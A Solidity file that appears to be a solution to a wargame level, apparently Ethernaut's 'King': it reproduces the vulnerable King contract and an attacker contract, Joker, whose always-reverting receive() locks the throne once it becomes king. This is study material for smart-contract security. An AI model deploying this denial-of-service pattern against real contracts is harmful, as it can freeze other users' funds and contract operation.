// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 0x088A6E1dd7001F7D5c2075D4d410703F2aF170Df
// 0.001 ETH
contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract Joker {
    address payable kingAddr =
        payable(address(0x088A6E1dd7001F7D5c2075D4d410703F2aF170Df));
    King king = King(kingAddr);
    address payable owner;

    constructor() payable {
        owner = payable(msg.sender);
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function becomeKing() public onlyOwner {
        uint prize = king.prize();
        (bool success, ) = kingAddr.call{value: prize}("");
        require(success);
    }

    function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
    }

    receive() external payable {
        owner.transfer(address(this).balance + 1);
    }
}
